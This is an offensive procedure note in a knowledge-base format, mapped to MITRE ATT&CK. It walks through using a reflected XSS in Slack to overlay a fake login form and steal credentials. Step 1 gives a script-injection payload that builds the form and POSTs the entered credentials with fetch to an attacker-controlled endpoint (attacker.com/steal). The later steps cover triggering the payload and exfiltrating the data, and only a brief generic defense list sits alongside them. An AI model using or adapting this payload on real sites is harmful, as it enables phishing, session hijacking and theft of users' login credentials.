---
tags:
  - javascript-execution
  - credential-theft
  - phishing-form
type: procedure
tools:
  - '[[tools/Firefox-Browser]]'
tactics:
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Credentials from Password Stores]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 7edb0ba9-e20c-45fd-b7f8-558bb84ca1c5
created_at: '2025-12-13T23:52:49.392Z'
updated_at: '2025-12-13T23:52:49.392Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Credentials from Password Stores]]'
---
# Execute-JavaScript-Payload-for-Credential-Theft

## Summary

This procedure executes the injected JavaScript payload from the Slack XSS to perform actions like displaying a fake login form, capturing user credentials, and exfiltrating them to an attacker-controlled server.

## Description

Upon reflection, the payload runs in the victim's browser context, allowing DOM manipulation to overlay a phishing form that mimics Slack's login. Credentials entered are sent via AJAX to the attacker. This works in browsers without XSS auditors, enabling session hijacking or further attacks.

## Requirements

1. Successful URL delivery and visit
2. Attacker-controlled server for exfiltration
3. Advanced payload (beyond alert) for form creation

## Defense

Defensive measures and detection strategies:

- Deploy XSS protections in browsers
- Monitor for unexpected script execution in web apps
- Use multi-factor authentication to mitigate stolen creds

## Objectives

1. Inject and run JavaScript in victim context
2. Harvest credentials via fake interface
3. Exfiltrate data without detection

## Instructions

### Step 1: Inject Advanced Payload

**Context**: Replace simple alert with a payload that creates a phishing form.

Craft payload: `"><script>var form = document.createElement('form'); /* add inputs for username/password */ form.onsubmit = function(){fetch('https://attacker.com/steal', {method:'POST', body: new FormData(form)}); }; document.body.appendChild(form);</script>`.

> Expected: Form overlays the page upon execution.

### Step 2: Trigger Execution

**Context**: Ensure the victim interacts with the page to activate the payload.

Visit URL in [[tools/Firefox-Browser]]; payload auto-executes on load.

> Expected: Fake login prompt appears, prompting credential entry.

### Step 3: Exfiltrate Data

**Context**: Capture and send submitted data to attacker endpoint.

Payload includes fetch or XMLHttpRequest to POST credentials.

> Expected: Data received on attacker's server, confirming theft.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Credentials from Password Stores]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox-Browser]]

## Tags

- [[credential-theft]]
- [[javascript-execution]]
